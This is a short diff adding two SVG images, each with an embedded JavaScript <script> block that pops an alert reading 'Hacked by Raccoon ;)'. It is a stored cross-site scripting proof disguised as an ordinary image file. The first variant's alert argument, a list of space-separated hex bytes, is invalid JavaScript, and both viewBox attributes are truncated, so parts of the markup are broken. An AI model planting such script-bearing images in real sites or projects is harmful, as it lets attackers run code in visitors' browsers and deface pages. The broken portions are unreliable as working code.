@@ -1,0 +1,15 @@
+                       
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 1>
+<rect width="124" height="124" rx="24" fill="#000000"/>
+   <script type="text/javascript">
+        alert(0x48 0x61 0x63 0x6b 0x65 0x64 0x20 0x62 0x79 0x20 0x52 0x61 0x63 0x63 0x6f 0x6f 0x6e 0x20 0x3b 0x29);
+   </script>
+</svg>
+
+
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 1>
+<rect width="124" height="124" rx="24" fill="#000000"/>
+   <script type="text/javascript">
+      alert("Hacked by Raccoon ;)");
+   </script>
+</svg>
